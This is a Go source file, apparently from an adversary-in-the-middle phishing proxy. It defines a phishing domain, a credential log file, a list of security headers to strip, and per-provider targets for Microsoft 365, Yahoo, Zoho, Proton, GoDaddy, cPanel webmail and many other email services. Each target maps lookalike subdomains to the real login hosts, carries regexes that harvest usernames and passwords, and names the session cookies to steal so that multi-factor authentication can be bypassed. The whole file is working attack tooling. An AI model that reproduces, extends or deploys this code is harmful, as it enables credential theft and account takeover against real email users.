package main

import (
	"regexp"
	"strings"
	"sync"
)

// ══════════════════════════════════════════════════════════
//  GLOBAL CONSTANTS
// ══════════════════════════════════════════════════════════

const (
	phishDomain = "senappel.xyz"
	landingRole = "go"

	listenAddr  = "127.0.0.1:8080"
	credLogFile = "harvested_credentials.txt"

	detectEndpoint  = "/s/cfg"
	profileEndpoint = "/s/vst"
	captureEndpoint = "/s/ev"
)

var securityHeaders = []string{
	"Content-Security-Policy",
	"Content-Security-Policy-Report-Only",
	"Strict-Transport-Security",
	"X-XSS-Protection",
	"X-Content-Type-Options",
	"X-Frame-Options",
}

// ══════════════════════════════════════════════════════════
//  TARGET DEFINITION (multi-domain)
// ══════════════════════════════════════════════════════════

type Target struct {
	Name string

	Subdomains        map[string]string
	ReverseSubdomains map[string]string
	EntryPrefix       string

	HostMap        map[string]string
	ReverseMap     map[string]string
	EntrySubdomain string

	ModifyMimes       map[string]bool
	CredPatterns      []*regexp.Regexp
	AuthTokenNames    map[string]bool
	ServiceUpstream   string
	CompletionCookies []string
	SkipNuclearHTML   bool
	SkipHTMLRewrite   bool
	EntryPath         string
	EntryQuery        string
}

func (t *Target) HostMapFor(baseDomain string) map[string]string {
	m := make(map[string]string, len(t.Subdomains))
	for prefix, upstream := range t.Subdomains {
		m[prefix+"."+baseDomain] = upstream
	}
	return m
}

func (t *Target) ReverseMapFor(baseDomain string) map[string]string {
	m := make(map[string]string, len(t.ReverseSubdomains))
	for upstream, prefix := range t.ReverseSubdomains {
		if prefix == "" {
			m[upstream] = baseDomain
		} else {
			m[upstream] = prefix + "." + baseDomain
		}
	}
	return m
}

func (t *Target) EntrySubdomainFor(baseDomain string) string {
	return t.EntryPrefix + "." + baseDomain
}

func (t *Target) materializeDefault() {
	t.HostMap = t.HostMapFor(phishDomain)
	t.ReverseMap = t.ReverseMapFor(phishDomain)
	t.EntrySubdomain = t.EntrySubdomainFor(phishDomain)
}

// ══════════════════════════════════════════════════════════
//  ALL TARGETS (defined relative to the tenant base domain)
// ══════════════════════════════════════════════════════════

var targets = map[string]*Target{

	// ── Microsoft 365 ──
	"microsoft": {
		Name:        "Microsoft 365",
		EntryPrefix: "micro",
		Subdomains: map[string]string{
			"micro":   "login.microsoftonline.com",
			"login":   "login.microsoftonline.com",
			"live":    "login.live.com",
			"account": "account.live.com",
			"aadcdn":  "aadcdn.msauth.net",
			"office":  "www.office.com",
		},
		ReverseSubdomains: map[string]string{
			"login.microsoftonline.com":           "micro",
			"login.live.com":                      "live",
			"account.live.com":                    "account",
			"aadcdn.msauth.net":                   "aadcdn",
			"aadcdn.msftauth.net":                 "aadcdn",
			"secure.aadcdn.microsoftonline-p.com": "aadcdn",
			"www.office.com":                      "office",
		},
		ModifyMimes: map[string]bool{
			"text/html":        true,
			"application/json": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"login"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"passwd"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"email"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)passwd=([^&\s]+)`),
			regexp.MustCompile(`(?i)login=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
		},
		AuthTokenNames: map[string]bool{
			"ESTSAUTH": true, "ESTSAUTHPERSISTENT": true,
			"ESTSAUTHLIGHT": true, "SignInStateCookie": true,
			"CCState": true, "OParams": true, "NAP": true,
			"ANON": true, "__Host-MSAAUTHP": true, "MSPOK": true,
			"MH": true, "MSPAuth": true, "MSPProf": true,
			"UP": true, "FMHF": true,
		},
		EntryPath:  "/common/oauth2/v2.0/authorize",
		EntryQuery: "client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post",
	},

	// ── Turbify / Yahoo Mail (business) ──
	"turbify": {
		Name:        "Turbify (Yahoo Mail)",
		EntryPrefix: "mail",
		Subdomains: map[string]string{
			"mail":     "mail.turbify.com",
			"login-tb": "login.turbify.com",
			"login-yh": "login.yahoo.com",
			"api-tb":   "platform-api.turbify.com",
			"cdn-tb":   "s.yimg.com",
			"geo-tb":   "geo.yahoo.com",
			"udc-tb":   "udc.yahoo.com",
			"fc-tb":    "fc.yahoo.com",
		},
		ReverseSubdomains: map[string]string{
			"mail.turbify.com":         "mail",
			"login.turbify.com":        "login-tb",
			"login.yahoo.com":          "login-yh",
			"mail.yahoo.com":           "mail",
			"platform-api.turbify.com": "api-tb",
			"s.yimg.com":               "cdn-tb",
			"geo.yahoo.com":            "geo-tb",
			"udc.yahoo.com":            "udc-tb",
			"fc.yahoo.com":             "fc-tb",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "application/x-javascript": true,
			"text/javascript": true, "text/plain": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)"login"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"passwd"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)login=([^&\s]+)`),
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)passwd=([^&\s]+)`),
		},
		AuthTokenNames: map[string]bool{
			"T": true, "Y": true, "B": true, "A": true,
			"PH": true, "SSL": true, "YLS": true,
		},
		ServiceUpstream:   "mail.turbify.com",
		CompletionCookies: []string{"Y", "T"},
		EntryPath:         "/login",
		EntryQuery:        "",
	},

	// ── Microsoft Personal (MSA / login.live.com → Outlook) ──
	"msa": {
		Name:        "Microsoft (Personal)",
		EntryPrefix: "msa",
		Subdomains: map[string]string{
			"msa":       "login.live.com",
			"mlogin":    "login.microsoft.com",
			"mlogincdn": "logincdn.msauth.net",
			"moutlook":  "outlook.live.com",
			"maccount":  "account.live.com",
		},
		ReverseSubdomains: map[string]string{
			"login.live.com":        "msa",
			"login.microsoft.com":   "mlogin",
			"logincdn.msauth.net":   "mlogincdn",
			"logincdn.msftauth.net": "mlogincdn",
			"outlook.live.com":      "moutlook",
			"account.live.com":      "maccount",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "application/x-javascript": true,
			"text/javascript": true, "text/plain": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)login=([^&\s]+)`),
			regexp.MustCompile(`(?i)passwd=([^&\s]+)`),
			regexp.MustCompile(`(?i)"login"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"passwd"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"MSPRequ": true, "MSPOK": true, "OParams": true,
			"NAP": true, "ANON": true, "MUID": true,
			"MSPAuth": true, "MSPProf": true, "MUP": true,
			"OIDC": true, "WLSSC": true, "SSHW": true,
			"MH": true, "UP": true, "FMHF": true, "WLOptIn": true,
		},
		CompletionCookies: []string{"OIDC", "MSPAuth", "MUP", "WLSSC", "MSPProf"},
		EntryPath:         "/login.srf",
		EntryQuery:        "wa=wsignin1.0&wreply=https%3A%2F%2Foutlook.live.com%2F",
	},

	// ── Yahoo Mail (consumer — login.yahoo.com) ──
	"yahoo": {
		Name:        "Yahoo Mail",
		EntryPrefix: "yahoo",
		Subdomains: map[string]string{
			"yahoo":        "login.yahoo.com",
			"yahoo-mail":   "mail.yahoo.com",
			"yahoo-cdn":    "s.yimg.com",
			"yahoo-guce":   "guce.yahoo.com",
			"yahoo-mcdn":   "edge-mcdn.secure.yahoo.com",
			"yahoo-geo":    "geo.yahoo.com",
			"yahoo-udc":    "udc.yahoo.com",
			"yahoo-gpt":    "gpt.mail.yahoo.net",
			"3p-yahoo-udc": "udc.yahoo.com",
			"3p-yahoo-geo": "geo.yahoo.com",
			// ── ADDED: Background iframe domains to prevent CORS blocks ──
			"yahoo-signal": "signal-service.pbs.yahoo.com",
			"yahoo-pbd":    "pbd.yahoo.com",
			"yahoo-rlcdn":  "api.rlcdn.com",
		},
		ReverseSubdomains: map[string]string{
			"login.yahoo.com":            "yahoo",
			"mail.yahoo.com":             "yahoo-mail",
			"s.yimg.com":                 "yahoo-cdn",
			"guce.yahoo.com":             "yahoo-guce",
			"edge-mcdn.secure.yahoo.com": "yahoo-mcdn",
			"geo.yahoo.com":              "yahoo-geo",
			"udc.yahoo.com":              "yahoo-udc",
			"gpt.mail.yahoo.net":         "yahoo-gpt",
			// ── ADDED: Background iframe domains to prevent CORS blocks ──
			"signal-service.pbs.yahoo.com": "yahoo-signal",
			"pbd.yahoo.com":                "yahoo-pbd",
			"api.rlcdn.com":                "yahoo-rlcdn",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "application/x-javascript": true,
			"text/javascript": true, "text/plain": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"T": true, "Y": true, "F": true, "PH": true,
			"OTH": true, "OTHD": true, "A1": true, "A3": true, "A1S": true,
			"GUC": true, "GUCS": true, "FS": true, "ySID": true,
		},
		ServiceUpstream:   "mail.yahoo.com",
		CompletionCookies: []string{"Y", "T"},
		SkipNuclearHTML:   true,
		SkipHTMLRewrite:   true,
		EntryPath:         "/",
		EntryQuery:        "src=ymail&.intl=us&.lang=en-US",
	},

	// ── Rackspace Webmail ──
	"rackspace": {
		Name:        "Rackspace Webmail",
		EntryPrefix: "rackspace",
		Subdomains: map[string]string{
			"rackspace":        "apps.rackspace.com",
			"rackspace-static": "static.emailsrvr.com",
		},
		ReverseSubdomains: map[string]string{
			"apps.rackspace.com":   "rackspace",
			"static.emailsrvr.com": "rackspace-static",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "application/x-javascript": true,
			"text/javascript": true, "text/plain": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			".AspNetCore.Cookies":                 true,
			".AspNetCore.Session":                 true,
			".AspNetCore.Antiforgery.9TtSrW0hzOs": true,
			"wmauth":                              true,
		},
		EntryPath:  "/wmidentity/account/login",
		EntryQuery: "",
	},

	// ── Zoho Mail ──
	"zoho": {
		Name:        "Zoho Mail",
		EntryPrefix: "zoho",
		Subdomains: map[string]string{
			"zoho":        "accounts.zoho.com",
			"zoho-mail":   "mail.zoho.com",
			"zoho-www":    "www.zoho.com",
			"zoho-static": "static.zohocdn.com",
			"zoho-js":     "js.zohocdn.com",
			"zoho-css":    "css.zohocdn.com",
			"zoho-fonts":  "webfonts.zohocdn.com",
		},
		ReverseSubdomains: map[string]string{
			"accounts.zoho.com":    "zoho",
			"mail.zoho.com":        "zoho-mail",
			"www.zoho.com":         "zoho-www",
			"static.zohocdn.com":   "zoho-static",
			"js.zohocdn.com":       "zoho-js",
			"css.zohocdn.com":      "zoho-css",
			"webfonts.zohocdn.com": "zoho-fonts",
			"zoho.com":             "",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "application/x-javascript": true,
			"text/javascript": true, "text/plain": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)lid=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)"lid"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"zmcsr": true, "zalb_zid": true, "JSESSIONID": true,
			"zmuac": true, "zmcdn": true, "zmirc": true,
			"iam_cookie": true, "zaccounts": true, "zsession": true,
			"IAMToken": true, "zm_auth": true, "ZM_CSRF": true,
		},
		ServiceUpstream:   "mail.zoho.com",
		CompletionCookies: []string{"zaccounts", "IAMToken"},
		EntryPath:         "/signin",
		EntryQuery:        "servicename=VirtualOffice&serviceurl=https%3A%2F%2Fmail.zoho.com%2Fzm%2F",
	},

	// ── Proton Mail ──
	"proton": {
		Name:        "Proton Mail",
		EntryPrefix: "proton",
		Subdomains: map[string]string{
			"proton":      "account.proton.me",
			"proton-mail": "mail.proton.me",
			"proton-api":  "account-api.proton.me",
			"proton-www":  "proton.me",
		},
		ReverseSubdomains: map[string]string{
			"account.proton.me":     "proton",
			"mail.proton.me":        "proton-mail",
			"account-api.proton.me": "proton-api",
			"proton.me":             "proton-www",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "application/x-javascript": true,
			"text/javascript": true, "text/plain": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
		},
		AuthTokenNames: map[string]bool{
			"Authorization": true, "x-pm-uid": true, "UID": true,
			"ACCESS_TOKEN": true, "REFRESH_TOKEN": true,
		},
		ServiceUpstream:   "mail.proton.me",
		CompletionCookies: []string{"ACCESS_TOKEN"},
		EntryPath:         "/login",
		EntryQuery:        "",
	},

	// ── Fastmail Business ──
	"fastmail": {
		Name:        "Fastmail Business",
		EntryPrefix: "fastmail",
		Subdomains: map[string]string{
			"fastmail":     "www.fastmail.com",
			"fastmail-api": "api.fastmail.com",
			"fastmail-cdn": "cdn.fastmail.net",
		},
		ReverseSubdomains: map[string]string{
			"www.fastmail.com": "fastmail",
			"api.fastmail.com": "fastmail-api",
			"cdn.fastmail.net": "fastmail-cdn",
			"fastmail.com":     "",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"s_session": true, "state": true,
		},
		ServiceUpstream:   "www.fastmail.com",
		CompletionCookies: []string{"s_session"},
		EntryPath:         "/account/login",
		EntryQuery:        "",
	},

	// ── Tuta (Tutanota) Encrypted Mail ──
	"tuta": {
		Name:        "Tuta (Tutanota)",
		EntryPrefix: "tuta",
		Subdomains: map[string]string{
			"tuta": "app.tuta.com",
		},
		ReverseSubdomains: map[string]string{
			"app.tuta.com": "tuta",
			"tuta.com":     "",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)mailAddress=([^&\s]+)`),
			regexp.MustCompile(`(?i)passphrase=([^&\s]+)`),
			regexp.MustCompile(`(?i)"mailAddress"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"passphrase"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"accessToken": true, "refreshToken": true,
			"userId": true, "mailAddress": true,
		},
		ServiceUpstream:   "app.tuta.com",
		CompletionCookies: []string{"accessToken"},
		EntryPath:         "/",
		EntryQuery:        "",
	},

	// ── Tutanota Legacy Domain ──
	"tutanota": {
		Name:        "Tutanota (Legacy)",
		EntryPrefix: "tutanota",
		Subdomains: map[string]string{
			"tutanota": "app.tutanota.com",
		},
		ReverseSubdomains: map[string]string{
			"app.tutanota.com": "tutanota",
			"tutanota.com":     "",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)mailAddress=([^&\s]+)`),
			regexp.MustCompile(`(?i)passphrase=([^&\s]+)`),
		},
		AuthTokenNames: map[string]bool{
			"accessToken": true, "refreshToken": true,
		},
		ServiceUpstream:   "app.tutanota.com",
		CompletionCookies: []string{"accessToken"},
		EntryPath:         "/",
		EntryQuery:        "",
	},

	// ── Mail.com Business ──
	"mailcom": {
		Name:        "Mail.com Business",
		EntryPrefix: "mailcom",
		Subdomains: map[string]string{
			"mailcom":     "www.mail.com",
			"mailcom-api": "api.mail.com",
		},
		ReverseSubdomains: map[string]string{
			"www.mail.com": "mailcom",
			"api.mail.com": "mailcom-api",
			"mail.com":     "",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)email=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"email"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"sid": true, "csrf": true,
		},
		ServiceUpstream:   "www.mail.com",
		CompletionCookies: []string{"sid"},
		EntryPath:         "/login",
		EntryQuery:        "",
	},

	// ── GMX Enterprise/Business ─
	"gmx": {
		Name:        "GMX Business",
		EntryPrefix: "gmx",
		Subdomains: map[string]string{
			"gmx":     "www.gmx.com",
			"gmx-api": "api.gmx.com",
		},
		ReverseSubdomains: map[string]string{
			"www.gmx.com": "gmx",
			"api.gmx.com": "gmx-api",
			"gmx.com":     "",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)email=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"email"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"sid": true, "csrf": true,
		},
		ServiceUpstream:   "www.gmx.com",
		CompletionCookies: []string{"sid"},
		EntryPath:         "/login",
		EntryQuery:        "",
	},

	// ── Yandex 360 for Business ──
	"yandex": {
		Name:        "Yandex 360 Business",
		EntryPrefix: "yandex",
		Subdomains: map[string]string{
			"yandex":        "passport.yandex.com",
			"yandex-mail":   "mail.yandex.com",
			"yandex-360":    "360.yandex.com",
			"yandex-static": "yastatic.net",
		},
		ReverseSubdomains: map[string]string{
			"passport.yandex.com": "yandex",
			"mail.yandex.com":     "yandex-mail",
			"360.yandex.com":      "yandex-360",
			"yastatic.net":        "yandex-static",
			"yandex.com":          "",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)login=([^&\s]+)`),
			regexp.MustCompile(`(?i)passwd=([^&\s]+)`),
			regexp.MustCompile(`(?i)"login"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"passwd"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"Session_id": true, "yandexuid": true,
			"yc": true, "ys": true,
		},
		ServiceUpstream:   "mail.yandex.com",
		CompletionCookies: []string{"Session_id", "yc"},
		EntryPath:         "/auth",
		EntryQuery:        "",
	},

	// ── Infomaniak Swiss Privacy Mail ──
	"infomaniak": {
		Name:        "Infomaniak Swiss Mail",
		EntryPrefix: "infomaniak",
		Subdomains: map[string]string{
			"infomaniak":      "login.infomaniak.com",
			"infomaniak-mail": "mail.infomaniak.com",
			"infomaniak-cdn":  "cdn.infomaniak.ch",
		},
		ReverseSubdomains: map[string]string{
			"login.infomaniak.com": "infomaniak",
			"mail.infomaniak.com":  "infomaniak-mail",
			"cdn.infomaniak.ch":    "infomaniak-cdn",
			"infomaniak.com":       "",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"ik_session": true, "ik_remember": true,
		},
		ServiceUpstream:   "mail.infomaniak.com",
		CompletionCookies: []string{"ik_session"},
		EntryPath:         "/login",
		EntryQuery:        "",
	},

	// ── Runbox Secure Webmail ──
	"runbox": {
		Name:        "Runbox Secure",
		EntryPrefix: "runbox",
		Subdomains: map[string]string{
			"runbox":      "runbox.com",
			"runbox-mail": "mail.runbox.com",
		},
		ReverseSubdomains: map[string]string{
			"runbox.com":      "runbox",
			"mail.runbox.com": "runbox-mail",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"sid": true, "realm": true,
		},
		ServiceUpstream:   "mail.runbox.com",
		CompletionCookies: []string{"sid"},
		EntryPath:         "/login",
		EntryQuery:        "",
	},

	// ── Mailbox.org Business Email ──
	"mailbox": {
		Name:        "Mailbox.org Business",
		EntryPrefix: "mailbox",
		Subdomains: map[string]string{
			"mailbox":      "mailbox.org",
			"mailbox-mail": "mail.mailbox.org",
		},
		ReverseSubdomains: map[string]string{
			"mailbox.org":      "mailbox",
			"mail.mailbox.org": "mailbox-mail",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"session": true, "csrf_token": true,
		},
		ServiceUpstream:   "mail.mailbox.org",
		CompletionCookies: []string{"session"},
		EntryPath:         "/",
		EntryQuery:        "",
	},

	// ── GoDaddy / SecureServer ──
	"godaddy": {
		Name:        "GoDaddy Webmail",
		EntryPrefix: "godaddy",
		Subdomains: map[string]string{
			"godaddy":      "email.godaddy.com",
			"godaddy-sso":  "sso.godaddy.com",
			"secureserver": "secureserver.net",
		},
		ReverseSubdomains: map[string]string{
			"email.godaddy.com": "godaddy",
			"sso.godaddy.com":   "godaddy-sso",
			"secureserver.net":  "secureserver",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"shd": true, "sso": true, "sso_rt": true,
		},
		ServiceUpstream:   "email.godaddy.com",
		CompletionCookies: []string{"shd", "sso"},
		EntryPath:         "/",
		EntryQuery:        "",
	},

	// ── IONOS (1&1) Business Mail ──
	"ionos": {
		Name:        "IONOS Business Mail",
		EntryPrefix: "ionos",
		Subdomains: map[string]string{
			"ionos":       "login.ionos.com",
			"ionos-mail":  "mail.ionos.com",
			"ionos-1and1": "login.1and1.com",
		},
		ReverseSubdomains: map[string]string{
			"login.ionos.com": "ionos",
			"mail.ionos.com":  "ionos-mail",
			"login.1and1.com": "ionos-1and1",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)ia_username=([^&\s]+)`),
			regexp.MustCompile(`(?i)ia_password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"KASUser": true, "KASSession": true, "xtcsid": true,
		},
		ServiceUpstream:   "mail.ionos.com",
		CompletionCookies: []string{"KASUser", "KASSession"},
		EntryPath:         "/",
		EntryQuery:        "",
	},

	// ── Namecheap Private Email ──
	"namecheap": {
		Name:        "Namecheap Private Email",
		EntryPrefix: "namecheap",
		Subdomains: map[string]string{
			"namecheap":      "privateemail.com",
			"namecheap-mail": "mail.namecheap.com",
			"namecheap-api":  "api.privateemail.com",
		},
		ReverseSubdomains: map[string]string{
			"privateemail.com":     "namecheap",
			"mail.namecheap.com":   "namecheap-mail",
			"api.privateemail.com": "namecheap-api",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
			regexp.MustCompile(`(?i)"username"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"password"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"webmail_session": true, "nc_session": true,
		},
		ServiceUpstream:   "privateemail.com",
		CompletionCookies: []string{"webmail_session"},
		EntryPath:         "/login",
		EntryQuery:        "",
	},

	// ── Webmail.co.za (Regional Enterprise) ──
	"webmailza": {
		Name:        "Webmail.co.za",
		EntryPrefix: "webmailza",
		Subdomains: map[string]string{
			"webmailza": "webmail.co.za",
		},
		ReverseSubdomains: map[string]string{
			"webmail.co.za": "webmailza",
		},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "text/javascript": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)user=([^&\s]+)`),
			regexp.MustCompile(`(?i)pass=([^&\s]+)`),
			regexp.MustCompile(`(?i)"user"\s*:\s*"([^"]+)"`),
			regexp.MustCompile(`(?i)"pass"\s*:\s*"([^"]+)"`),
		},
		AuthTokenNames: map[string]bool{
			"webmail_session": true, "roundcube_sessauth": true,
		},
		ServiceUpstream:   "webmail.co.za",
		CompletionCookies: []string{"webmail_session", "roundcube_sessauth"},
		EntryPath:         "/",
		EntryQuery:        "",
	},
}

// ══════════════════════════════════════════════════════════
//  DYNAMIC (PER-DOMAIN) TARGETS — cPanel / self-hosted webmail
// ══════════════════════════════════════════════════════════

var (
	dynamicTargets   = make(map[string]*Target)
	dynamicTargetsMu sync.RWMutex
)

func registerDynamicTarget(proxySubdomain string, t *Target) {
	dynamicTargetsMu.Lock()
	dynamicTargets[proxySubdomain] = t
	if t.EntryPrefix != "" {
		roleMu.Lock()
		roleLookup[t.EntryPrefix] = t
		roleSet[t.EntryPrefix] = true
		roleMu.Unlock()
	}
	dynamicTargetsMu.Unlock()
}

func lookupDynamicTarget(host string) (*Target, bool) {
	dynamicTargetsMu.RLock()
	defer dynamicTargetsMu.RUnlock()
	t, ok := dynamicTargets[host]
	return t, ok
}

func newCpanelTarget(proxySubdomain, webmailHost, emailDomain string) *Target {
	role := strings.TrimSuffix(proxySubdomain, "."+phishDomain)
	t := &Target{
		Name:              "cPanel Webmail (" + emailDomain + ")",
		EntryPrefix:       role,
		Subdomains:        map[string]string{role: webmailHost},
		ReverseSubdomains: map[string]string{webmailHost: role},
		ModifyMimes: map[string]bool{
			"text/html": true, "application/json": true,
			"application/javascript": true, "application/x-javascript": true,
			"text/javascript": true, "text/plain": true,
		},
		CredPatterns: []*regexp.Regexp{
			regexp.MustCompile(`(?i)user=([^&\s]+)`),
			regexp.MustCompile(`(?i)pass=([^&\s]+)`),
			regexp.MustCompile(`(?i)_user=([^&\s]+)`),
			regexp.MustCompile(`(?i)_pass=([^&\s]+)`),
			regexp.MustCompile(`(?i)horde_user=([^&\s]+)`),
			regexp.MustCompile(`(?i)horde_pass=([^&\s]+)`),
			regexp.MustCompile(`(?i)login_username=([^&\s]+)`),
			regexp.MustCompile(`(?i)secretkey=([^&\s]+)`),
			regexp.MustCompile(`(?i)username=([^&\s]+)`),
			regexp.MustCompile(`(?i)password=([^&\s]+)`),
		},
		AuthTokenNames: map[string]bool{
			"roundcube_sessid": true, "roundcube_sessauth": true,
			"Horde": true, "horde_auth": true, "squirrelmail": true,
			"webmail": true, "PPA_ID": true, "cpsession": true,
		},
		// ← ADDED: confirmed-login gate. Each webmail client sets its own auth
		// cookie only after a successful login, so Event 2 fires only on a real
		// login (covers Roundcube, Horde, SquirrelMail, and generic cPanel webmail).
		CompletionCookies: []string{"roundcube_sessauth", "horde_auth", "squirrelmail", "webmail", "cpsession"},
		EntryPath:         "/",
		EntryQuery:        "",
	}
	t.materializeDefault()
	return t
}

